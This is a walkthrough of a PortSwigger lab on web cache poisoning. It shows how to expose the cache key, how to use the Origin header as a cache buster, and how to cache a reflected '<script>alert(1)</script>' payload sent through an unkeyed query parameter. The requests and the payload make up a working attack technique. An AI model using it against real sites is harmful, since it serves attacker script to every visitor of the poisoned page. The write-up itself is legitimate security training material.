
# Web cache poisoning via an unkeyed query string

This lab is vulnerable to web cache poisoning because the query string is unkeyed. A user regularly visits this site's home page using Chrome.

To solve the lab, poison the home page with a response that executes alert(1) in the victim's browser.

Hint:

- If you're struggling, you can use the Pragma: x-get-cache-key header to display the cache key in the response. This applies to some of the other labs as well.

- Although you can't use a query parameter as a cache buster, there is a common request header that will be keyed if present. You can use the Param Miner extension to automatically add a cache buster header to your requests.

---------------------------------------------

References: 

- https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws



![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20string/1.png)

---------------------------------------------

First I will add the header to display the cache key in the response headers:

```
GET / HTTP/2
...
Pragma: x-get-cache-key
```



![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20string/2.png)


Then I added headers for a cache buster:

```
GET / HTTP/2
...
Pragma: x-get-cache-key
Accept-Encoding: gzip, deflate, cachebuster
Accept: */*, text/cachebuster
Cookie: cachebuster=1
Origin: https://cachebuster.0a68004803664d558681b8a800650043.web-security-academy.net
```



![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20string/3.png)


Whatever we add to the “Origin” header will be in X-Cache-Key, we can use it as a cache buster:



![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20string/4.png)


And the query is reflected in the response:



![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20string/5.png)


We can execute an alert(1) with:

```
GET /?evil='/><script>alert(1)</script> HTTP/2
...
Origin: 0a68004803664d558681b8a800650043.web-security-academy.net
```



![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20string/6.png)


When “X-Cache: hit”, visit “/” and the alert(1) is still in the response:

```
GET / HTTP/2
...
Origin: 0a68004803664d558681b8a800650043.web-security-academy.net
```



![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20string/7.png)


Send again the payload but without the “Origin” header:

```
GET /?evil='/><script>alert(1)</script> HTTP/2
...
```



![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20string/8.png)


This will generate an alert to pop up in “/”:






![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20string/9.png)
![img](images/Web%20cache%20poisoning%20via%20an%20unkeyed%20query%20string/10.png)